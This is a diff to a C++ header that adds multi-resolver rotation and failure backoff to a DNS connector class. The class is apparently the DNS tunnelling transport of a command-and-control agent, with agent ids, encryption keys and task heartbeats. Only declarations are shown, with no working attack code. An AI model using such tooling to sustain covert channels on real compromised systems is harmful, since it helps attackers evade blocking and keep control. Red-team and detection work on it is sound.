@@ -8,6 +8,14 @@ class ConnectorDNS
 private:
     ProfileDNS profile = { 0 };
 
+    // Multi-resolver support (similar to DoH URL rotation)
+    CHAR  rawResolvers[512] = { 0 };  // Storage for the full resolver string
+    CHAR* resolverList[16] = { 0 };   // Pointers to individual resolvers
+    ULONG resolverCount = 0;
+    ULONG currentResolverIndex = 0;
+    ULONG resolverFailCount[16] = { 0 };
+    ULONG resolverDisabledUntil[16] = { 0 };
+
     // cached session/transport parameters
     CHAR  sid[17] = { 0 };       // 8 bytes agent_id as 16-char hex string
     BYTE  encryptKey[16] = { 0 };
@@ -68,6 +76,9 @@ public:
     // IsBusy: TRUE if we're in the middle of a multi-chunk download OR heartbeat indicated pending tasks
     BOOL  IsBusy() const;
     ULONG GetDownAckOffset() const { return downAckOffset; }
+
+    // DNS query with resolver rotation and failure backoff
+    BOOL  QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
     
 private:
     BOOL  hasPendingTasks = FALSE; // Set when heartbeat says "has tasks" but GET hasn't completed yet
